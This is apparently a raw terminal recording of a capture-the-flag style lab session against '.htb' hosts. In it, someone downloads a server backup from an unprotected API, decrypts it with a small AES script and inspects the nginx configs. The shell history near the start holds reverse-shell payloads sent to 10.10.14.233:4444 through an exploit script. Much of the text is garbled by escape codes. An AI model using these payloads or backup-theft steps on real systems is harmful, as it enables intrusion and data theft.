+└─$ [?1h=[?2004hrrrm hash.txtrmrm rm b       bbaacckbackupbackupp-backup-20260404-2backup-20260404-22005957.zip ls                            lsunzip nginx_dec.zip -d backups-ui_dec.zip -d backupsunzip nginx-ui_dec.zip -d backupsls                               lspython3 unzip.pypip3 install pycryptodome --break-system-packagespip3--break-system-packagessudo apt install python3-crypto                  sudorypto     pip3 install Crypto       pip3python3 unzip.py   pythnano   ls           lsmkdir backupsmkgobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txtcurl/api/backup -v -O                                                            curl-v -Ogobuster dir -u http://admin.snapped.htbw /usr/share/wordlists/seclists/Discovery/Web-Content/common.txtgobu-w /umkdir backups                                                                                             ls           lsnano unzip.pynapython3 unzip.pypip3 install Cryptopip3apt install python3-cryptoapt sudo apt install python3-cryptopip3cryptodome --break-system-packagespip3--break-system-packagespython3 unzip.py                                 pythls              unzip nginx-ui_dec.zip -d backupsunzip nginx-ui_dec.zip -d backups_dec.zip -d backups   unzip nginx_dec.zip -d backupsls                            rm backup-20260404-205957.ziprm backup-20260404-205957.ziprm backup-20260404-205957.ziprm backup-20260404-205957.zipls                           lsunzip nginx_dec.zip -d backups-ui_dec.zip -d backupsunzip nginx-ui_dec.zip -d backupsls                               lspython3 unzip.pypip3 install pycryptodome --break-system-packagespip3--break-system-packagessudo apt install python3-crypto                  sudorypto     pip3 install Crypto       pip3python3 unzip.py   pythnano   ls           lsmkdir backupsmkgobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txtcurl/api/backup -v -O                                                            curl-v -O     curlunzip nginx.zip                         backup-20260404-210101.zipunzip backup-20260404-210101.zipnginx.zip                 unzip nginx.zip-ui.zipbackup-20260404-205957.zipunzip backup-20260404-205957.zipls                              lscd Downloadsexit        exitid  idwhoamiexit  exitclearcleals   exitexitnc -lvnp 4444nc -tmux         exitexitnano wingftp.keynanols              python3 52347.py -u http://ftp.wingdata.htb -c "bash -c '/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"python3 52347.py -u-c "bash -c '/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"echo hi'"                                            python3 52347.py -u-c "bash -c 'echo hi'"nano                                                    python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'echo hi'"python3 52347.py -u-c "bash -c 'echo hi'"'/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'python3 52347.py -u-c 'bash -c /bin/bash "/bin/bash -l > /dev/tcp/10.10.14.233/4 0<&1 2>&1"'"''"python3 52347.py -u-c "bash -c '/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"0<&196;exec 196<>; sh <&196 >&196 2>&196"python3 52347.py -u-c "0<&196;exec 196<>/dev/tcp/10.10.14.233/4444; sh <&196 >&196 2>0.0.1/4242                                                     python3 52347.py -u http://ftp.wingdata.htb -c "^[[200~bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"python3 52347.py -u-c "^[[200~bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196                                0<&196;exec 196<>/d<&196 >&196 2>&196python3 52347.py -u http://ftp.wingdata.htb -c "0<&196;exec 196<>/dev/tcp/10.10.14.233/4444; sh <&196 >&196 2>&196"bash -c '/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"     python3 52347.py -u-c "bash -c '/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"'""'python3 52347.py -u-c 'bash -c "/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1"''  "'echo hi'"                                          python3 52347.py -u-c "bash -c 'echo hi'"nano 52347.py                                                     nano 52347.pypython3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'echo hi'"/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"python3 52347.py -u-c "bash -c '/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"ls                                                                                                            lsnano wingftp.keyexit            exittmuxtmuxnc -lvnp 4444exit         exitls  lsclearexit exitwhoamiwhoaid    exitexitcd Downloadscd Dls          unzip backup-20260404-205957.zipunzip backup-20260404-205957.zipnginx-ui.zip              unzip nginx-ui.zip.zip   backup-20260404-210101.zipunzip backup-20260404-210101.zipi pz  ip.   zip1    .zip0     1.zip1      01.zip0       101.zip1        0101.zip2         10101.zip-          210101.zip4           -210101.zip0            4-210101.zip4             04-210101.zip0              404-210101.zip6               0404-210101.zip2                60404-210101.zip0                 260404-210101.zip2                  0260404-210101.zip-                   20260404-210101.zipp                    -20260404-210101.zipu                     p-20260404-210101.zipk                      up-20260404-210101.zipc                       kup-20260404-210101.zipa                        ckup-20260404-210101.zipb                         ackup-20260404-210101.zip                          nginx_dec.zip -d backups                         nginx_dec.zip -d backupsi                          unzip nginx_dec.zip -d backupsz                           ip nginx_dec.zip -d backupsun                            zip nginx_dec.zip -d backupsu                             unzip nginx_dec.zip -d backups                              rrrm hash.txtrmrm rm b       bbaacckbackupbackupp--*backup-*[?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hrrrm backup-*rmrm rm n       nninignx    nnggiinnxx*nginx*[?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hcccurl http://admin.snapped.htb/api/backup -v -Ocucurrlcurl http://admin.snapped.htb/api/backup -v -O-v -O[?1l>[?2004l
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:--:--     0* Host admin.snapped.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.18.211
+*   Trying 10.129.18.211:80...
+* Established connection to admin.snapped.htb (10.129.18.211 port 80) from 10.10.14.233 port 41844 
+* using HTTP/1.x
+> GET /api/backup HTTP/1.1
+> Host: admin.snapped.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.24.0 (Ubuntu)
+< Date: Sun, 05 Apr 2026 01:16:37 GMT
+< Content-Type: application/zip
+< Content-Length: 18354
+< Connection: keep-alive
+< Accept-Ranges: bytes
+< Cache-Control: must-revalidate
+< Content-Description: File Transfer
+< Content-Disposition: attachment; filename=backup-20260404-211637.zip
+< Content-Transfer-Encoding: binary
+< Expires: 0
+< Last-Modified: Sun, 05 Apr 2026 01:16:37 GMT
+< Pragma: public
+< Request-Id: 88beb15d-4eb2-4410-a9e2-aad6da26a1d6
+< X-Backup-Security: FFErUUZDCT4E1s2ePpMO/IebECg1JYEORIwL6G1jDnw=:ta4G9zTYOeORJTJgKi56Pg==
+< 
+{ [10226 bytes data]
+100 18354 100 18354   0     0 106532     0  --:--:-- --:--:-- --:--:-- 106709
+* Connection #0 to host admin.snapped.htb:80 left intact
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hllls[?1l>[?2004l
+ 51902.py                   backup           full_results.gnmap   hash.txt         kobold-htb.crt       machines_us-4.ovpn       machines_us-7.ovpn   poc.py                                wingftp2
+ 52347.py                   backups          full_results.nmap    id_ed25519       kobold.nmap          machines_us-5.ovpn       passwd               pspy64                                wingftp.key
+'academy-regular(1).ovpn'  'exploit(1).py'   full_results.xml    'id_ed25519(1)'   kobold.xml           machines_us-6.ovpn      'passwd(1)'          'release_arena_us-release-2(1).ovpn'
+ academy-regular.ovpn       exploit.py       hash_info.txt        kobold.gnmap     machines_sg-2.ovpn  'machines_us-7(1).ovpn'  'poc(1).py'           unzip.py
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hnnnano unzip.pynanannonanoo o unzip.pyunzip.py[?1l>[?2004l
+[?2004h(B)0[?1049h[?1h=[?1h=[?25l[ Reading... ][ Read 20 lines ]  GNU nano 8.6                                                                                       unzip.py                                                                                                ^G Help^O Write Out     ^F Where Is^K Cut^T Execute^C LocationM-U UndoM-A Set Mark     M-] To Bracket   M-B Previous     ◂ Back^◂ Prev Word^X Exit^R Read File     ^\ Replace^U Paste^J Justify^/ Go To Line    M-E RedoM-6 Copy^B Where Was     M-F Next▸ Forward^▸ Next Wordimport base64from Crypto.Cipher import AESkey = base64.b64decode("at3lvTAbtI+AeSYhRS1k+o6R4JsJJBg1JrovocBENXg=")iv  = base64.b64decode("AMBL5155VlP+wM636ejxpA==")for filename in ["nginx-ui.zip", "nginx.zip"]:try:with open(filename, "rb") as f:ct = f.read()cipher = AES.new(key, AES.MODE_CBC, iv)pt = cipher.decrypt(ct)pad = pt[-1]pt = pt[:-pad]out = filename.replace(".zip", "_dec.zip")with open(out, "wb") as f:f.write(pt)print(f"Decrypted: {out}")except Exception as e:print(f"Failed {filename}: {e}")[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25hM[?25l[?25h[?25l[?25h[?25l[?25h[?25l*[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25lFFErUUZDCT4E1s2ePpMO/IebECg1JYEORIwL6G1jDnw=:ta4G9zTYOeORJTJgKi56Pg==")[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25lFFErUUZDCT4E1s2ePpMO/IebECg1JYEORIwL6G1jDnw=:ta4G9zTYOeORJTJgKi56Pg==")[?25h[?25l[?25hM[?25l[?25h[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25lSave modified buffer?                                                                                                                                                                                         Y Yes N No  ^C CancelMM[?25h[?25l^G HelpM-D DOS FormatM-A AppendM-B Backup File^T Browse^C Cancel         M-M Mac FormatM-P Prepend^Q Discard bufferMWrite to File: unzip.py[?25h[?25l [ Writing... ] [ Wrote 20 lines ][?25h[?1049l[?1l>[?2004l                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004huuunzip nginx_dec.zip -d backupsununzziipunzipp p b                       backup-20260404-210101.zipbaacckkups/                  s p -20260404-210101.zipu                     p-20260404-210101.zipup                    [?1l>[?2004l
+Archive:  backup
+replace hash_info.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: hash_info.txt           
+  inflating: nginx-ui.zip            
+  inflating: nginx.zip               
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hpppython3 unzip.pyunzip backup    unzip backupp           ppython3 unzip.python3 unzip.pypython3 unzip.py[?1l>[?2004l
+Decrypted: nginx-ui_dec.zip
+Decrypted: nginx_dec.zip
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004huuunzip backupununzziipunzipp p n     nginx_dec.zip -d backupsni                      ni nginx_dec.zip -d backupsnggiinnginxnginxnginx
+Completing zip file
+nginx_dec.zip     nginx-ui_dec.zip  nginx-ui.zip      nginx.zip       MMunzip nginx_dec.zip -d backupsnginx_dec.zip -d backupsx_dec.zip -d backups[?1l>[?2004l
+Archive:  nginx_dec.zip
+   creating: backups/conf.d/
+  inflating: backups/fastcgi.conf    
+  inflating: backups/fastcgi_params  
+  inflating: backups/koi-utf         
+  inflating: backups/koi-win         
+  inflating: backups/mime.types      
+   creating: backups/modules-available/
+   creating: backups/modules-enabled/
+  inflating: backups/nginx.conf      
+  inflating: backups/proxy_params    
+  inflating: backups/scgi_params     
+   creating: backups/sites-available/
+  inflating: backups/sites-available/nginx-ui  
+  inflating: backups/sites-available/snapped  
+   creating: backups/sites-enabled/
+  inflating: backups/sites-enabled/nginx-ui  -> /etc/nginx/sites-available/nginx-ui 
+  inflating: backups/sites-enabled/snapped  -> /etc/nginx/sites-available/snapped 
+   creating: backups/snippets/
+  inflating: backups/snippets/fastcgi-php.conf  
+  inflating: backups/snippets/snakeoil.conf  
+  inflating: backups/uwsgi_params    
+  inflating: backups/win-utf         
+finishing deferred symbolic links:
+  backups/sites-enabled/nginx-ui -> /etc/nginx/sites-available/nginx-ui
+  backups/sites-enabled/snapped -> /etc/nginx/sites-available/snapped
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hunzip nginx_dec.zip -d backupsunzip nginx_dec.zip -d backups-_dec.zip -d backupsnginx-_dec.zipu_dec.zip -d backupsi_dec.zip -d backupsnginx-ui_dec.zip[?1l>[?2004l
+Archive:  nginx-ui_dec.zip
+  inflating: backups/app.ini         
+  inflating: backups/database.db     
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hcccurl http://admin.snapped.htb/api/backup -v -Ocd                                            cd Downloadscd cd b        bbaacckkups/s [?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hlllsls[?1l>[?2004l
+app.ini  database.db   fastcgi_params  koi-win     modules-available  nginx.conf    scgi_params      sites-enabled  uwsgi_params
+conf.d   fastcgi.conf  koi-utf         mime.types  modules-enabled    proxy_params  sites-available  snippets       win-utf
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hcccd backupsca        cat hash.txtcatcatca          cat hash.txtc           ccd backups          nnnano unzip.pynanannonanoo o n       nnggiinnxx..ccoonf  [?1l>[?2004l
+[?2004h(B)0[?1049h[?1h=[?1h=[?25l[ Reading... ][ Read 84 lines ]  GNU nano 8.6                                                                                      nginx.conf                                                                                               ^G Help^O Write Out     ^F Where Is^K Cut^T Execute^C LocationM-U UndoM-A Set Mark     M-] To Bracket   M-B Previous     ◂ Back^◂ Prev Word^X Exit^R Read File     ^\ Replace^U Paste^J Justify^/ Go To Line    M-E RedoM-6 Copy^B Where Was     M-F Next▸ Forward^▸ Next Worduser www-data;worker_processes auto;pid /run/nginx.pid;error_log /var/log/nginx/error.log;include /etc/nginx/modules-enabled/*.conf;events {        worker_connections 768;        # multi_accept on;}http {        ##        # Basic Settings        ##        sendfile on;        tcp_nopush on;        types_hash_max_size 2048;        # server_tokens off;        # server_names_hash_bucket_size 64;        # server_name_in_redirect off;        include /etc/nginx/mime.types;        default_type application/octet-stream;        ##        # SSL Settings        ##        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE        ssl_prefer_server_ciphers on;        ##        # Logging Settings        ##        access_log /var/log/nginx/access.log;        error_log /var/log/nginx/error.log;        ##        # Gzip Settings        ##        gzip on;        # gzip_vary on;        # gzip_proxied any;        # gzip_comp_level 6;        # gzip_buffers 16 8k;        # gzip_http_version 1.1;        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;        ##[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h78
+        # Virtual Host Configs[?25l[?25h78
+        ##[?25l[?25h78
+[?25l[?25h78
+        include /etc/nginx/conf.d/*.conf;[?25l[?25h78
+        include /etc/nginx/sites-enabled/*;[?25l[?25h78
+}[?25l[?25h78
+[?25l[?25h78
+[?25l[?25h78
+#mail {[?25l[?25h78
+#       # See sample authentication script at:[?25l[?25h78
+#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript[?25l[?25h78
+#[?25l[?25h78
+#       # auth_http localhost/auth.php;[?25l[?25h78
+#       # pop3_capabilities "TOP" "USER";[?25l[?25h78
+#       # imap_capabilities "IMAP4rev1" "UIDPLUS";[?25l[?25h78
+#[?25l[?25h78
+#       server {[?25l[?25h78
+#               listen     localhost:110;[?25l[?25h78
+#               protocol   pop3;[?25l[?25h78
+#               proxy      on;[?25l[?25h78
+#       }[?25l[?25h78
+#[?25l[?25h78
+#       server {[?25l[?25h78
+#               listen     localhost:143;[?25l[?25h78
+#               protocol   imap;[?25l[?25h78
+#               proxy      on;[?25l[?25h78
+#       }[?25l[?25h78
+#}[?25l[?25h78
+[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25hM[?25l[?25h78M        ##[?25l[?25h78M[?25l[?25h78M        default_type application/octet-stream;[?25l[?25h78M        include /etc/nginx/mime.types;[?25l[?25h78M[?25l[?25h78M        # server_name_in_redirect off;[?25l[?25h78M        # server_names_hash_bucket_size 64;[?25l[?25h78M[?25l[?25h78M        # server_tokens off;[?25l[?25h78M        types_hash_max_size 2048;[?25l[?25h78M        tcp_nopush on;[?25l[?25h78M        sendfile on;[?25l[?25h78M[?25l[?25h78M        ##[?25l[?25h78M        # Basic Settings[?25l[?25h78M        ##[?25l[?25h78M[?25l[?25h78Mhttp {[?25l[?25h78M[?25l[?25h78M}[?25l[?25h78M        # multi_accept on;[?25l[?25h78M        worker_connections 768;[?25l[?25h78Mevents {[?25l[?25h78M[?25l[?25h78Minclude /etc/nginx/modules-enabled/*.conf;[?25l[?25h78Merror_log /var/log/nginx/error.log;[?25l[?25h78Mpid /run/nginx.pid;[?25l[?25h78Mworker_processes auto;[?25l[?25h78Muser www-data;[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[ line  1/85 ( 1%), col  1/15 (  6%), char    0/1483 ( 0%) ][?25h[?25l[?25h[?1049l[?1l>[?2004l                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hlllslsls ls ./lib/py3-linux-x86_64/OurLifeNF-                               --llaa a l -  ./lib/py3-linux-x86_64/OurLifeNF                                l ls  cccd backupsca        cat hash.txtcatcatt t k       kkooii--uutf  [?1l>[?2004l
+
+# This map is not a full koi8-r <> utf8 map: it does not contain
+# box-drawing and some other characters.  Besides this map contains
+# several koi8-u and Byelorussian letters which are not in koi8-r.
+# If you need a full and standard map, use contrib/unicode2nginx/koi-utf
+# map instead.
+
+charset_map  koi8-r  utf-8 {
+
+    80  E282AC ; # euro
+
+    95  E280A2 ; # bullet
+
+    9A  C2A0 ;   # &nbsp;
+
+    9E  C2B7 ;   # &middot;
+
+    A3  D191 ;   # small yo
+    A4  D194 ;   # small Ukrainian ye
+
+    A6  D196 ;   # small Ukrainian i
+    A7  D197 ;   # small Ukrainian yi
+
+    AD  D291 ;   # small Ukrainian soft g
+    AE  D19E ;   # small Byelorussian short u
+
+    B0  C2B0 ;   # &deg;
+
+    B3  D081 ;   # capital YO
+    B4  D084 ;   # capital Ukrainian YE
+
+    B6  D086 ;   # capital Ukrainian I
+    B7  D087 ;   # capital Ukrainian YI
+
+    B9  E28496 ; # numero sign
+
+    BD  D290 ;   # capital Ukrainian soft G
+    BE  D18E ;   # capital Byelorussian short U
+
+    BF  C2A9 ;   # (C)
+
+    C0  D18E ;   # small yu
+    C1  D0B0 ;   # small a
+    C2  D0B1 ;   # small b
+    C3  D186 ;   # small ts
+    C4  D0B4 ;   # small d
+    C5  D0B5 ;   # small ye
+    C6  D184 ;   # small f
+    C7  D0B3 ;   # small g
+    C8  D185 ;   # small kh
+    C9  D0B8 ;   # small i
+    CA  D0B9 ;   # small j
+    CB  D0BA ;   # small k
+    CC  D0BB ;   # small l
+    CD  D0BC ;   # small m
+    CE  D0BD ;   # small n
+    CF  D0BE ;   # small o
+
+    D0  D0BF ;   # small p
+    D1  D18F ;   # small ya
+    D2  D180 ;   # small r
+    D3  D181 ;   # small s
+    D4  D182 ;   # small t
+    D5  D183 ;   # small u
+    D6  D0B6 ;   # small zh
+    D7  D0B2 ;   # small v
+    D8  D18C ;   # small soft sign
+    D9  D18B ;   # small y
+    DA  D0B7 ;   # small z
+    DB  D188 ;   # small sh
+    DC  D18D ;   # small e
+    DD  D189 ;   # small shch
+    DE  D187 ;   # small ch
+    DF  D18A ;   # small hard sign
+
+    E0  D0AE ;   # capital YU
+    E1  D090 ;   # capital A
+    E2  D091 ;   # capital B
+    E3  D0A6 ;   # capital TS
+    E4  D094 ;   # capital D
+    E5  D095 ;   # capital YE
+    E6  D0A4 ;   # capital F
+    E7  D093 ;   # capital G
+    E8  D0A5 ;   # capital KH
+    E9  D098 ;   # capital I
+    EA  D099 ;   # capital J
+    EB  D09A ;   # capital K
+    EC  D09B ;   # capital L
+    ED  D09C ;   # capital M
+    EE  D09D ;   # capital N
+    EF  D09E ;   # capital O
+
+    F0  D09F ;   # capital P
+    F1  D0AF ;   # capital YA
+    F2  D0A0 ;   # capital R
+    F3  D0A1 ;   # capital S
+    F4  D0A2 ;   # capital T
+    F5  D0A3 ;   # capital U
+    F6  D096 ;   # capital ZH
+    F7  D092 ;   # capital V
+    F8  D0AC ;   # capital soft sign
+    F9  D0AB ;   # capital Y
+    FA  D097 ;   # capital Z
+    FB  D0A8 ;   # capital SH
+    FC  D0AD ;   # capital E
+    FD  D0A9 ;   # capital SHCH
+    FE  D0A7 ;   # capital CH
+    FF  D0AA ;   # capital hard sign
+}
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hcat koi-utfcat koi-utfnano nginx.confls             lscd backupscdunzip nginx-ui_dec.zip -d backups   unzip-dpython3 unzip.py              pythounzip backup    nano unzip.pynanounzip backup unzipython3 unzip.pyunzip nginx_dec.zip -d backupsunzip-d-ui_dec.zip -d backupsunzipipc                       ls        lsnano nginx.confnacat koi-utf               lllslsls ls ./lib/py3-linux-x86_64/OurLifeNF-                               --lla[?1l>[?2004l
+total 336
+drwxrwxr-x 8 kali kali   4096 Apr  4 21:18 .
+drwxr-xr-x 3 kali kali   4096 Apr  4 21:17 ..
+-rw-r--r-- 1 kali kali   2295 Apr  4 21:16 app.ini
+drwxr-xr-x 2 kali kali   4096 Apr  4 21:16 conf.d
+-rw-r--r-- 1 kali kali 262144 Apr  4 21:16 database.db
+-rw-r--r-- 1 kali kali   1125 Apr  4 21:16 fastcgi.conf
+-rw-r--r-- 1 kali kali   1055 Apr  4 21:16 fastcgi_params
+-rw-r--r-- 1 kali kali   2837 Apr  4 21:16 koi-utf
+-rw-r--r-- 1 kali kali   2223 Apr  4 21:16 koi-win
+-rw-r--r-- 1 kali kali   5465 Apr  4 21:16 mime.types
+drwxr-xr-x 2 kali kali   4096 Apr  4 21:16 modules-available
+drwxr-xr-x 2 kali kali   4096 Apr  4 21:16 modules-enabled
+-rw-r--r-- 1 kali kali   1483 Apr  4 21:16 nginx.conf
+-rw-r--r-- 1 kali kali    180 Apr  4 21:16 proxy_params
+-rw-r--r-- 1 kali kali    636 Apr  4 21:16 scgi_params
+drwxr-xr-x 2 kali kali   4096 Apr  4 21:16 sites-available
+drwxr-xr-x 2 kali kali   4096 Apr  4 21:16 sites-enabled
+drwxr-xr-x 2 kali kali   4096 Apr  4 21:16 snippets
+-rw-r--r-- 1 kali kali    664 Apr  4 21:16 uwsgi_params
+-rw-r--r-- 1 kali kali   3071 Apr  4 21:16 win-utf
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hcccat koi-utfcd         cd backupscd cd s      ssiitteess--eennvsites-enva  sites-ennaabblleed[?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups/sites-enabled]
+└─$ [?1h=[?2004hllls -lals    [?1l>[?2004l
+nginx-ui  snapped
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups/sites-enabled]
+└─$ [?1h=[?2004hnnnano nginx.confnanannonanoo o nnnggiinx.confnginf f f f f  nginx.confnxx-    -uui[?1l>[?2004l
+[?2004h(B)0[?1049h[?1h=[?1h=[?25l[ New File ]  GNU nano 8.6                                                                                       nginx-ui                                                                                                ^G Help^O Write Out     ^F Where Is^K Cut^T Execute^C LocationM-U UndoM-A Set Mark     M-] To Bracket   M-B Previous     ◂ Back^◂ Prev Word^X Exit^R Read File     ^\ Replace^U Paste^J Justify^/ Go To Line    M-E RedoM-6 Copy^B Where Was     M-F Next▸ Forward^▸ Next Word[?25h[?25l[?25h[?1049l[?1l>[?2004l                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups/sites-enabled]
+└─$ [?1h=[?2004hlllslsls ls -la---lla[?1l>[?2004l
+total 8
+drwxr-xr-x 2 kali kali 4096 Apr  4 21:19 .
+drwxrwxr-x 8 kali kali 4096 Apr  4 21:18 ..
+lrwxrwxrwx 1 kali kali   35 Apr  4 21:17 nginx-ui -> /etc/nginx/sites-available/nginx-ui
+lrwxrwxrwx 1 kali kali   34 Apr  4 21:17 snapped -> /etc/nginx/sites-available/snapped
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups/sites-enabled]
+└─$ [?1h=[?2004hcccd sites-enabledcdcdcd cd .            ....[?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hllls -lalsls ls ---llaa a mm sssiitteess--eene - -aavvaaiillable/e [?1l>[?2004l
+total 16
+drwxr-xr-x 2 kali kali 4096 Apr  4 21:16 .
+drwxrwxr-x 8 kali kali 4096 Apr  4 21:18 ..
+-rw-r--r-- 1 kali kali  463 Apr  4 21:16 nginx-ui
+-rw-r--r-- 1 kali kali  264 Apr  4 21:16 snapped
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
